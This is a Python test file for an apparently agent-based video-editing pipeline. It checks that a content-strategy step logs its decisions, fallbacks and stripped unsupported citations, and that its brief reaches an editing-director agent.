def test_the_fallback_is_recorded_in_the_trace(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, clip_set, a_vision(), a_research())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "content_strategy"]
    assert rows[-1]["fallback_used"], "a fallback must show in the trace"


def test_a_stripped_citation_is_noted_in_the_trace(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm({**GOOD, "key_points": [
        {"point": "invented", "support": "research",
         "evidence_urls": [GHOST]}]})
    run(ctx, tracer_span, clip_set, a_vision(), a_research())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "content_strategy"]
    notes = " ".join(n for r in rows for n in r["notes"])
    assert "never retrieved" in notes


# ---------------------------------------------- 18. decision logging

def test_decisions_are_recorded_with_the_existing_shape(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())

    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0

    whats = {d.what for d in art.decisions}
    assert "Evidence the strategy was formed from" in whats
    assert "Central topic and angle" in whats
    assert "Pacing" in whats


def test_the_evidence_decision_names_both_sources(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    d = next(d for d in art.decisions
             if d.what == "Evidence the strategy was formed from")
    assert d.chose == "Vision + Research"
    assert d.decided_by == "measurement"


def test_the_evidence_decision_is_honest_when_there_is_nothing(cs_ctx,
                                                               tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, None, None)
    d = next(d for d in art.decisions
             if d.what == "Evidence the strategy was formed from")
    assert d.chose == "neither"


def test_the_fallback_decision_is_attributed_to_fallback(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    kinds = {d.decided_by for d in art.decisions}
    assert "fallback" in kinds
    assert "llm" not in kinds, "no LLM ran, so nothing may be attributed to one"


def test_grounding_is_visible_in_the_key_points_decision(cs_ctx, tracer_span):
    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_vision(), a_research())
    d = next(d for d in art.decisions
             if d.what == "Key points to communicate")
    assert "grounded in evidence" in d.chose
    assert d.decided_by == "llm"


# ---------------------------------------- the strategy reaches the edit

def test_the_director_receives_the_brief(cs_ctx, tracer_span):
    """The whole point: the strategy must reach the agent that acts on it."""
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = cs_ctx
    ctx.llm = strategy_llm(GOOD)
    strategy = run(ctx, tracer_span, clip_set, a_vision(),
                   a_research()).payload

    seen = []
    ctx.llm = strategy_llm({"strategy": "s", "opening_rationale": "r",
                            "segments": [{"clip_id": LIVELY,
                                          "target_seconds": 4.0,
                                          "reason": "x"}],
                            "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       strategy=strategy, revision=0)

    prompt = seen[0]
    assert "THE BRIEF" in prompt
    assert "a working gear train" in prompt
    assert "pacing    fast" in prompt
    # and the director is still told it owns the timing
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_brief_invalidates_the_edit_plan_cache(cs_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    base = ContentStrategy(central_topic="one thing", pacing="fast")
    other = ContentStrategy(central_topic="a different thing", pacing="slow")

    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, strategy=base,
                          revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, strategy=other,
                          revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_a_brief(cs_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    strategy = ContentStrategy(central_topic="a working gear train",
                               pacing="fast", live=True, confidence=0.8)
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             strategy=strategy, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Brief from ContentStrategy")
    assert "a working gear train" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_brief_at_all(cs_ctx, tracer_span):
    """The strategy is an enhancement; losing it must not cost the video."""
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = cs_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             strategy=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Brief from ContentStrategy"
                   for d in art.decisions)


# ------------------------------------------------- helpers on the model

def test_ordered_clips_sorts_by_priority():
    s = ContentStrategy(clip_priorities=[
        ClipPriority(clip_id="b", priority=2),
        ClipPriority(clip_id="a", priority=1)])
    assert s.ordered_clips == ["a", "b"]


def test_grounded_points_excludes_unsupported_ones():
    s = ContentStrategy(key_points=[
        KeyPoint(point="grounded", support="vision", clip_ids=["a"]),
        KeyPoint(point="not", support="none")])
    assert [k.point for k in s.grounded_points] == ["grounded"]


def test_priority_for_finds_a_clip():
    s = ContentStrategy(clip_priorities=[ClipPriority(clip_id="a",
                                                      priority=1)])
    assert s.priority_for("a").priority == 1
    assert s.priority_for("missing") is None
